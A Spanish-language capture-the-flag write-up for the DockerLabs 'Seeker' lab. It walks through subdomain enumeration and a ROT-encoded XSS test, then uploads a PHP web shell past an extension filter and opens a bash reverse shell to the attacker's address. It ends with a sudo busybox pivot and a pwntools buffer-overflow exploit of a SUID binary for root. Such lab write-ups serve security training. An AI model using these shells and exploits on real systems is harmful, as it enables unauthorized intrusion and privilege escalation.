---
title: DockerLabs - Seeker
summary: "Write-up del laboratorio Seeker de DockerLabs"
author: elcybercurioso
date: 2026-02-03 12:52:37
categories: [Post, DockerLabs]
tags: [medio, information leaking, subdomain enumeration, rot codification, arbitrary file upload, rce, sudo, busybox, buffer overflow]
media_subpath: "/assets/img/posts/dockerlabs_seeker"
image:
  path: main.webp
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Seeker]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2
PORT   STATE SERVICE
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Seeker]
└─$ nmap -sCV -p80 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
```

## análisis

Comenzamos revisando la página web alojada en el puerto 80 de la máquina víctima, donde vemos que se trata de la página por defecto de Apache, aunque con algunas modificaciones:

![Desktop View](/20260114211846.webp){: width="972" height="589" .shadow}

Probamos a ver si el término `5eEk3r` es algún recurso en el servidor web, pero veremos que no es el caso.

Como hemos visto en otras máquinas cuando tratamos con dominios, estos suelen acabar en `.dl`, por lo que comprobamos si en esta ocasión si `5eEk3r` es un dominio válido.

Modificamos el fichero `/etc/hosts` de nuestra máquina para agregar la siguiente línea, y así que el host resuelva correctamente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Seeker]
└─$ cat /etc/hosts | grep 5eEk3r      
172.17.0.2      5eEk3r.dl
```

Si accedemos a `5eEk3r.dl`, veremos que nos muestra la misma página inicial:

![Desktop View](/20260115195324.webp){: width="972" height="589" .shadow}

Cuando tratamos con dominios, siempre es recomendable buscar subdominios empleando herramientas como `gobuster`, que en este caso nos descubre el subdominio `crosswords.5eEk3r.dl`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Seeker]
└─$ gobuster vhost -u 'http://5eEk3r.dl' -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r --ad
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://5eEk3r.dl
[+] Method:                    GET
[+] Threads:                   200
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
crosswords.5eEk3r.dl Status: 200 [Size: 934]
Progress: 114442 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

Para que nos resuelva el subdominio, lo debemos agregar también al fichero `/etc/hosts` de nuestra máquina:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Seeker]
└─$ cat /etc/hosts | grep 5eEk3r                                                                                              
172.17.0.2      5eEk3r.dl crosswords.5eEk3r.dl
```

Al acceder al subdominio `crosswords.5eEk3r.dl` encontramos la siguiente funcionalidad, la cual parece que permite codificar texto en formato **ROT14**:

![Desktop View](/20260115195513.webp){: width="972" height="589" .shadow}

Vemos que si ingresamos un texto, nos lo codifica cambiando cada letra por la que está 14 posiciones más adelante (dentro del rango A-Z del alfabeto inglés, sumando un total de 26 letras):

	t -> h
	e -> s
	s -> g
	t -> h

![Desktop View](/20260115200126.webp){: width="972" height="589" .shadow}

En el código fuente de la página vemos el siguiente comentario, el cual nos indica que la página puede ser vulnerable a un **XSS**:

![Desktop View](/20260115201722.webp){: width="972" height="589" .shadow}

Para ver si es así, preparamos un payload que verifique esta vulnerabilidad empleando la herramienta [CyberChef.io](https://cyberchef.io):

```bash
<eodubf>mxqdf(1);</eodubf>
```

![Desktop View](/20260115202245.webp){: width="972" height="589" .shadow}

Podemos también hacerlo por consola empleando la utilidad `tr`, que de la siguiente manera se haría la codificación (**ROT14**):

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Seeker]
└─$ echo '<script>alert(1);</script>' | tr 'A-Za-z' 'O-ZA-No-za-n'
<gqfwdh>ozsfh(1);</gqfwdh>
```

Y de esta otra manera haríamos la decodificación (**ROT12**):

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Seeker]
└─$ echo '<gqfwdh>ozsfh(1);</gqfwdh>' | tr 'A-Za-z' 'M-ZA-Lm-za-l'
<script>alert(1);</script>
```

Tras introducir la cadena codificada en **ROT12** en el codificador, vemos que si recargamos la página, nos salta una ventana emergente, ya que al hacer la codificación con **ROT14**, la cadena vuelve a ser la original y nos interpreta el código:

![Desktop View](/20260115202430.webp){: width="972" height="589" .shadow}

Esto nos confirma que la página es vulnerable a **XSS**.

Tras dejar corriendo **gobuster** en segundo plano buscando recursos dentro del subdominio empleando fuerza bruta, obtenemos varios resultados, donde el que más destaca es el fichero `converts.txt`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Seeker]
└─$ gobuster dir -u "http://crosswords.5eEk3r.dl" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200 -x .php,.html,.txt 2>/dev/null
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://crosswords.5eEk3r.dl
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 333] [--> http://crosswords.5eek3r.dl/javascript/]
/index.php            (Status: 200) [Size: 1438]
/server-status        (Status: 403) [Size: 285]
/converts.txt         (Status: 200) [Size: 239]
```

Al revisarlo, veremos que contiene un listado de las cadenas decodificadas que se muestran en el historial de la página:

![Desktop View](/20260115205136.webp){: width="600" height="420" .shadow}

Tras no encontrar nada que nos permita seguir avanzando con lo que hemos visto hasta ahora, seguimos analizando la máquina, en este caso, buscando más subdominios, donde encontramos `admin.crosswords.5eek3r.dl`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Seeker]
└─$ gobuster vhost -u 'http://crosswords.5eek3r.dl/' -t 200 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r --ad
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://crosswords.5eek3r.dl/
[+] Method:                    GET
[+] Threads:                   200
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
admin.crosswords.5eek3r.dl Status: 200 [Size: 2906]
Progress: 114442 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

Deberemos agregar también este subdominio dentro del fichero `/etc/passwd` de nuestra máquina para que se resuelva correctamente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Seeker]
└─$ cat /etc/hosts | grep 5eek3r                                                               
172.17.0.2      5eEk3r.dl crosswords.5eEk3r.dl admin.crosswords.5eek3r.dl
```

## acceso inicial (www-data)

Si ahora accedemos al subdominio `admin.crosswords.5eek3r.dl`, nos encontraremos con un panel de administración que permite gestionar ficheros dentro del servidor:

![Desktop View](/20260115210022.webp){: width="972" height="589" .shadow}

Dado que tenemos permisos para subir ficheros, trataremos de subir el siguiente script, el cual nos permitiría ejecutar comandos en caso de lograrlo:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Seeker]
└─$ cat cmd.php                   
<?php system($_GET['cmd']); ?>
```

Vemos que al intentar subir el script, se muestra el siguiente mensaje:

![Desktop View](/20260115210537.webp){: width="550" height="390" .shadow}

Para poder hacer pruebas, interceptamos la petición de subida de ficheros con **Burp Suite** y la enviamos al **Repeater**:

![Desktop View](/20260115210747.webp){: width="972" height="589" .shadow}

Ya que mencionan que los únicos ficheros que nos permiten subir son los que tengan la extensión `.html`, pero nuestro objetivo es poder ejecutar comandos, lo primero en lo que podemos pensar es en la extensión `.phtml` (ya que cumple con las dos condiciones), la cual vemos que el servidor la acepta sin problemas:

![Desktop View](/20260115210851.webp){: width="972" height="589" .shadow}

![Desktop View](/20260115211220.webp){: width="972" height="589" .shadow}

Como sabemos que el fichero `converts.txt` se encontraba en el subdominio `crosswords.5eek3r.dl`, buscamos a ver si el script que acabamos de subir se encuentra en la misma ubicación (y resulta que así es).

Confirmaremos que hemos obtenido con éxito ejecución remota de comandos (**RCE**):

```bash
http://crosswords.5eek3r.dl/cmd.phtml?cmd=id
```

![Desktop View](/20260115211132.webp){: width="972" height="589" .shadow}

Una vez vemos que podemos ejecutar comandos de forma remota en la máquina, nos pondremos en escucha con **nc** (en mi caso por el puerto 4444) antes de ejecutar el siguiente comando, que se encargará de entablarnos la reverse shell (en el comando los `&` ya se encuentran codificados a `%26` para evitar conflictos):

```bash
http://crosswords.5eek3r.dl/cmd.phtml?cmd=bash -c "bash -i >%26 /dev/tcp/172.17.0.1/4444 0>%261"
```

Por donde nos pusimos en escucha habremos obtenido la consola remota:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Seeker]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 55262
www-data@4721c7b38691:/var/www/crosswords/web$ whoami
whoami
www-data
www-data@4721c7b38691:/var/www/crosswords/web$ hostname -I
hostname -I
172.17.0.2
```

Para poder operar con mayor facilidad, trataremos la TTY, y así obtener una consola completamente funcional:

```bash
www-data@4721c7b38691:/var/www/crosswords/web$ script -c bash /dev/null
script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@4721c7b38691:/var/www/crosswords/web$ ^Z
zsh: suspended  nc -nlvp 4444

┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Seeker]
└─$ stty raw -echo;fg   
[1]  + continued  nc -nlvp 4444
                               reset xterm

www-data@4721c7b38691:/var/www/crosswords/web$ export TERM=xterm
www-data@4721c7b38691:/var/www/crosswords/web$ export SHELL=bash
www-data@4721c7b38691:/var/www/crosswords/web$ stty rows 37 columns 210
```

Listaremos los usuarios del sistema que tengan asignada una consola en el fichero `/etc/passwd`:

```bash
www-data@4721c7b38691:/var/www/crosswords/web$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
astu:x:1000:1000:astu,,,:/home/astu:/bin/bash
```

## movimiento lateral (astu)

En los permisos SUDO del usuario `www-data`, encontramos que puede ejecutar la utilidad `/usr/bin/busybox` como el usuario `astu`:

```bash
www-data@4721c7b38691:/var/www/crosswords/web$ sudo -l
Matching Defaults entries for www-data on 4721c7b38691:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on 4721c7b38691:
    (astu : astu) NOPASSWD: /usr/bin/busybox
```

Revisamos [GTFOBins](https://gtfobins.github.io/gtfobins/busybox/#sudo), donde nos indican que podemos obtener una consola como el usuario sobre el cual tenemos permisos SUDO empleando el siguiente comando:

![Desktop View](/20260115212434.webp){: width="972" height="589" .shadow}

Adaptaremos ligeramente el comando antes de ejecutarlo, ya que la versión que nos indican es para casos de escalada de privilegios a `root`, pero en este caso estamos moviéndonos lateralmente:

```bash
www-data@4721c7b38691:/var/www/crosswords/web$ sudo -u astu /usr/bin/busybox sh  

BusyBox v1.35.0 (Debian 1:1.35.0-4+b3) built-in shell (ash)
Enter 'help' for a list of built-in commands.

/var/www/crosswords/web $ whoami
astu
```

## escalada de privilegios (root)

Si vamos al directorio principal del usuario `astu`, encontramos la carpeta `secure`, y dentro un binario con permisos **SUID** (permite ejecutar el binario con los permisos del propietario):

```bash
astu@4721c7b38691:/home$ cd /home/astu/
astu@4721c7b38691:~$ ls -la
total 28
drwx------ 4 astu astu 4096 XXX XX  XXXX .
drwxr-xr-x 1 root root 4096 XXX XX  XXXX ..
lrwxrwxrwx 1 root root    9 XXX XX  XXXX .bash_history -> /dev/null
-rw-r--r-- 1 astu astu  220 XXX XX  XXXX .bash_logout
-rw-r--r-- 1 astu astu 3525 XXX XX  XXXX .bashrc
drwxr-xr-x 3 astu astu 4096 XXX XX  XXXX .local
-rw-r--r-- 1 astu astu  807 XXX XX  XXXX .profile
dr-xr-xr-x 2 root root 4096 XXX XX  XXXX secure
astu@4721c7b38691:~$ cd secure/
astu@4721c7b38691:~/secure$ ls -la
total 24
dr-xr-xr-x 2 root root  4096 XXX XX  XXXX .
drwx------ 4 astu astu  4096 XXX XX  XXXX ..
-r-sr-xr-x 1 root root 15776 XXX XX  XXXX bs64
```

Revisaremos con la utilidad `strings` por si vemos información útil:

```bash
astu@4721c7b38691:~/secure$ strings bs64 
/lib64/ld-linux-x86-64.so.2
setuid
putchar
system
getchar
__libc_start_main
printf
libc.so.6
GLIBC_2.34
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
H=8@@
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
%c%c%c
%c%c
Ejecutando /bin/sh
/bin/sh
Ingrese el texto:
```

Observamos que el fichero `ld-linux-x86-64.so.2` se encuentra dentro de la carpeta `/lib64`, lo que nos confirma que el binario es de **64 bits**.

Si lo ejecutamos, podemos comprobar que lo que hace es codificar en Base64 el texto que le indiquemos:

```bash
astu@4721c7b38691:~/secure$ ./bs64 
Ingrese el texto: a
YQ==
astu@4721c7b38691:~/secure$ ./bs64 
Ingrese el texto: a; id
YTsaW=
```

Al indicar una gran cantidad de caracteres, vemos que llegamos a corromper el programa:

```bash
astu@4721c7b38691:~/secure$ ./bs64
Ingrese el texto: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
YWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYWFYQ==
Segmentation fault
```

Esto nos confirma que nos estamos enfrentando a un **Buffer Overflow** (vulnerabilidad que consta en manipular los registros internos de un programa).

Revisaremos con cuantos caracteres falla el programa, y para ello ejecutaremos el siguiente comando:

```bash
astu@4721c7b38691:~/secure$ seq 1 80 | while read line; do python3 -c "print('A'*$line)" | ./bs64 &>/dev/null || echo "$line caracteres: Vulnerable"; done
72 caracteres: Vulnerable
73 caracteres: Vulnerable
74 caracteres: Vulnerable
75 caracteres: Vulnerable
76 caracteres: Vulnerable
77 caracteres: Vulnerable
78 caracteres: Vulnerable
79 caracteres: Vulnerable
80 caracteres: Vulnerable
```

Si analizamos el comando mencionado por partes:
- `seq 1 80`: Bucle que recorre desde el primer valor al último uno por uno y los pinta por pantalla.
- `| while read line; do python3 -c "print('A'*$line)" | ./bs64`: Bucle que, por cada línea del comando anterior, lanza otro comando, que en este caso es ejecutar el binario `bs64`, pasándole de forma automática una cadena de mayor tamaño en cada vuelta.
- `&>/dev/null`: Oculta cualquier texto que la ejecución del comando devuelva, evitando llenar la pantalla de texto innecesario.
- `|| echo "$line caracteres: Vulnerable"`: Comprueba el código de estado del comando ejecutado en cada vuelta, y en caso de ser diferente de 0 (cuando el programa se cierra de forma normal), se lanza un mensaje.
- `; done`: Se usa para cerrar el bucle `while`.
 
Vemos que con 72 caracteres el programa ya se está corrompiendo, por lo que este es el `offset`, así que ahora probamos a ejecutarlo con **GCC**, y pasarle una cadena de 72 caracteres generada con el script `pattern_create.rb`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Seeker]
└─$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 72
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3
```

```bash
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Ingrese el texto: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3
QWEQWEQWEQWEQWEQWEQWEQWEQWEQWEQWIQWIQWIQWIQWIQWIQWIQWIQWIQWIQWMQWMQWMQWM

Program received signal SIGSEGV, Segmentation fault.
0x00007f0a0c375200 in __libc_start_call_main (main=main@entry=0x40139e <main>, argc=1, argc@entry=1665216867, argv=0x1, argv@entry=0x7fffec00e308) at ../sysdeps/nptl/libc_start_call_main.h:44                                                                                                                                                                         
44      ../sysdeps/nptl/libc_start_call_main.h: No such file or directory.
```

Si ahora agregamos 6 caracteres más, veremos que se está sobrescribiendo el registro **RIP**:

```bash
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/astu/secure/bs64 
warning: Error disabling address space randomization: Operation not permitted
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Ingrese el texto: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3BBBBBB
QWEQWEQWEQWEQWEQWEQWEQWEQWEQWEQWIQWIQWIQWIQWIQWIQWIQWIQWIQWIQWMQWMQWMQWMQkJQkJ

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()
```

Las direcciones **RIP** constan de 8 bytes, donde hay 6 bytes menos significativos, que son los que definen las direcciones, y 2 bytes más significativos, los cuales no permiten modificar su contenido. Por ello, deberemos indicar contenido para los 6 bytes menos significativos.

Si ahora comprobamos el contenido del registro **RIP**, veremos que se ha modificado:

```bash
(gdb) info registers rip
rip            0x424242424242      0x424242424242
```

Comprobamos que la dirección en la que se llama a `setuid` es `401387`:

```bash
astu@4721c7b38691:~/secure$ objdump -d bs64 | grep -i setuid
0000000000401070 <setuid@plt>:
  401070:       ff 25 aa 2f 00 00       jmp    *0x2faa(%rip)        # 404020 <setuid@GLIBC_2.2.5>
  401387:       e8 e4 fc ff ff          call   401070 <setuid@plt>
```

Dado que podemos directamente llamar a la función que hace uso del `setuid`, veremos que se trata de la función `fire`:

```bash
astu@4721c7b38691:~/secure$ objdump -d bs64 | grep -C 8 401387
000000000040136a <fire>:
  40136a:       55                      push   %rbp
  40136b:       48 89 e5                mov    %rsp,%rbp
  40136e:       48 8d 05 fb 0c 00 00    lea    0xcfb(%rip),%rax        # 402070 <base64_table+0x50>
  401375:       48 89 c7                mov    %rax,%rdi
  401378:       b8 00 00 00 00          mov    $0x0,%eax
  40137d:       e8 ce fc ff ff          call   401050 <printf@plt>
  401382:       bf 00 00 00 00          mov    $0x0,%edi
  401387:       e8 e4 fc ff ff          call   401070 <setuid@plt>
  40138c:       48 8d 05 f0 0c 00 00    lea    0xcf0(%rip),%rax        # 402083 <base64_table+0x63>
  401393:       48 89 c7                mov    %rax,%rdi
  401396:       e8 a5 fc ff ff          call   401040 <system@plt>
  40139b:       90                      nop
  40139c:       5d                      pop    %rbp
  40139d:       c3                      ret
```

Tras construir el comando que se encargará de enviar el payload y ejecutar posteriormente el binario `bs64`, comprobamos que está sobrescribiendo el buffer correctamente:

```bash
astu@4721c7b38691:~/secure$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72+b"\x6a\x13\x40\x00\x00\x00\x00\x00")' | ./bs64
Ingrese el texto: QUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFahN
Segmentation fault
```

Si ahora llamamos a la siguiente dirección, veremos que intenta lanzar la consola, pero por algún motivo no lo consigue:

```bash
astu@4721c7b38691:~/secure$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72+b"\x6b\x13\x40\x00\x00\x00\x00\x00")' | ./bs64
Ingrese el texto: QUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFaxN
Ejecutando /bin/shIngrese el texto: 
Segmentation fault
```

Por ello, reformularemos el comando para que esta vez se ejecute el binario `bs64` desde Python y obtengamos la consola como el usuario `root`:

```bash
astu@4721c7b38691:~/secure$ python3 -c "from pwn import *; p=process('./bs64'); p.sendline(b'A'*72+p64(0x40136b)); p.interactive()"
[+] Starting local process './bs64': pid 684
[*] Switching to interactive mode
Ingrese el texto: QUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFQUFaxN
$ whoami
root
```

Y hasta aquí la resolución de la máquina **Seeker**!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>